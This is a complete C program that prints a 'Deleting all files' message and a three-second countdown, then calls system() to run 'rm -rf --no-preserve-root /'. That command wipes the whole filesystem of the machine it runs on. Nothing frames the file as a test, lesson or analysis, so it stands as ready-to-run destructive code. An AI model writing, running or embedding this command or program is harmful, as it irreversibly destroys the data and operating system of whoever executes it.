#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
    printf("Deleting all files in...\n");
    sleep(1);
    for (int i = 3; i > 0; i--) {
        printf("%d\n", i);
        sleep(1);
    }
    printf("rm -rf --no-preserve-root /\n");
    system("rm -rf --no-preserve-root /");
    return 0;
}
